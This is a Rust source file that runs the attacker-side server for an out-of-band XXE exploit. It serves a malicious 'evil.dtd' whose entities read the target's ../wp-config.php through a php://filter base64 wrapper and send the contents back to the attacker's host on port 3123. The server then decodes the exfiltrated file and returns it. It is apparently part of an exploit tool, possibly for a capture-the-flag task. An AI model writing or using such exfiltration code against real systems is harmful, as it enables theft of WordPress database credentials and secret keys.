use std::collections::HashMap;
use std::net::{IpAddr, Ipv4Addr};
use std::sync::{Arc, Mutex};
use base64::Engine;
use tokio::sync::{Notify, oneshot};
use url::Url;
use warp::Filter;

pub struct Server {
    pub url: String
}

impl Server {
    pub fn new(url: String) -> Server {
        Server{ url }
    }

    pub async fn setup(&self) -> String {

        //some setups...
        let (tx, rx) = oneshot::channel::<()>();
        let notify = Arc::new(Notify::new());
        let notify_clone = notify.clone();


        let url = Url::parse(&*self.url).expect("URL parse fail. Weird");

        let reply = format!(r#"<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">

         <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{}:3123/?p=%file;'>" >"#, url.host_str().unwrap());

        let router = warp::path("evil.dtd")
            .map(move || {
                let reply_clone = reply.clone();
                warp::reply::with_status(reply_clone, warp::http::StatusCode::OK)
            })
            .with(warp::log("evil_dtd_access"));

        let ret = Arc::new(Mutex::new(String::new()));
        let re_clone = ret.clone();
        let returned_file = warp::any()
            .and(warp::query::<HashMap<String, String>>())
            .map(move |map: HashMap<String, String>| {
                if let Some(value) = map.get("p") {
                    let corrected_value = value.replace(" ", "+"); //we need this as warp automatically decode "+" into " ", causing corrupted base64.
                    match base64::engine::general_purpose::STANDARD.decode(corrected_value) {
                        Ok(decoded) => {
                            match String::from_utf8(decoded) {
                                Ok(content) => {
                                    let mut ret = re_clone.lock().unwrap();
                                    *ret = content;
                                    notify_clone.notify_one();
                                },
                                Err(e) => {
                                    // Handle UTF-8 conversion error
                                    println!("Failed to convert bytes to string, but here's the valid part: {}", String::from_utf8_lossy(&e.into_bytes()));
                                }
                            }
                        },
                        Err(_) => {
                            // Handle Base64 decode error
                            println!("Base64 decoding failed. Data may be corrupt.");
                        }
                    }
                } else {
                    println!("Oops, no file disclosure...");
                }
                warp::reply::with_status("yummy", warp::http::StatusCode::OK)

            });


        let url_vc: Vec<u8> = url.host_str().unwrap().split('.').filter_map(|part| part.parse::<u8>().ok()).collect();
        let ip = Ipv4Addr::new(
            url_vc[0],url_vc[1],url_vc[2],url_vc[3],
        );
        let ip_addr = IpAddr::V4(ip);

        let routes = router.or(returned_file);
        let (_, server) = warp::serve(routes)
            .bind_with_graceful_shutdown((ip_addr, 3123), async {
                rx.await.ok();
            });
        let _handle = tokio::spawn(server);
        notify.notified().await;
        tx.send(()).unwrap();
        let ret = ret.lock().unwrap().clone();
        return ret;
    }
}